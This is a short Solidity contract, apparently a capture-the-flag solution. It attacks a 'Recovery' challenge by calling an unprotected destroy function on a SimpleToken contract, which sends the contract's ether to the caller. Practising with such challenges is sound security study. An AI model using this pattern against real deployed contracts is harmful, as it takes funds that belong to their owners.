// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Recovery.sol";

contract AttackOnRecovery {

    // you can get this sample token address from metamask transaction 
    SimpleToken public immutable simpleToken;
    constructor(address payable _simpleToken) {
        simpleToken = SimpleToken(_simpleToken);
    }

    function Attack() external {
        simpleToken.destroy(payable(msg.sender));
    }
}
